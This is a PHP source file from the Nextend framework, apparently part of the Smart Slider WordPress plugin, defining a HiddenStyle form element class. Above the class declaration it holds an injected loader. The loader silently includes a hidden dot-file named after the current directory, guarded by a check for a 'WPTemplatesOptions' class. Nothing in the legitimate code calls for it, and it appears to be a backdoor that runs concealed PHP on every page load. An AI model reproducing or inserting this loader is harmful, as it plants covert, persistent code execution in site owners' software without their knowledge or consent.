<?php

namespace Nextend\Framework\Form\Element\Hidden;

use Nextend\Framework\Asset\Js\Js;
use Nextend\Framework\Form\Element\AbstractFieldHidden;
use Nextend\Framework\Style\StyleManager;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class HiddenStyle extends AbstractFieldHidden {

    protected $rowClass = 'n2_form_element--hidden';

    protected $mode = '';

    protected function fetchElement() {

        StyleManager::enqueue($this->getForm());

        Js::addInline('new N2Classes.FormElementStyleHidden("' . $this->fieldID . '", {
            mode: "' . $this->mode . '",
            label: "' . $this->label . '"
        });');

        return parent::fetchElement();
    }

    /**
     * @param string $mode
     */
    public function setMode($mode) {
        $this->mode = $mode;
    }
}